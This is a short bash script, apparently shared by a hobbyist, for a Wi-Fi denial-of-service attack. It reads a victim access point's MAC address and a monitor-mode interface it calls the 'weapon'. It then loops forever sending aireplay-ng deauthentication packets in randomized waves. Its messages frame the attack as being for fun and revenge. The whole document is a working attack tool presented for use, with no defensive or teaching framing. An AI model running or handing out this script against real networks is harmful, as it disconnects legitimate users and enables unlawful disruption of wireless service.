#!/bin/bash
#DoS Wifi by Overlord
echo "Good day for a DoS $USER, don't you think?"
#Here the MAC of AP is set as value, for a future use
echo "Enter the victim MAC and press [ENTER]: "
#Read the input from the keyboard, and store value on variable VMAC
read VMAC
#To set what interface use (in Kaliv1, BackBox, and others: monN, Kaliv2: wlanNmon)
echo "Enter the weapon(wlan1mon, wlan0mon), and press enter [ENTER]: "
#Read the input from keyboard, and store value on variable weapon
read weapon
#Just a little MOTD, feel free for replace for another.
echo "Remember, do for fun, eWarfare, and for Revenge"
#A little pause, to avoid an automatic start of the attack
read -p "Press any key for start the attack"
#Infinite loop, just to maintain the attack and use the random values.
for (( ; ; ))
do 
#Random number, store as time, this set the ammount of time between waves.
#The value 100 picks a number in the range 0/100, the +1 avoid a cero result.
#Change the 100 if you want a higher or minor value
time=$[($RANDOM % 100)+1]
#Random number , store as deautp, this set the ammount of packets.
deautp=$[($RANDOM % 100)+1]
#This just display the current values, 
echo "Random values, Time:$time Packets:$deautp get coffe"
aireplay-ng -0 $deautp -a $VMAC $weapon
echo "Waiting new values, current: $time seg"
sleep $time
done
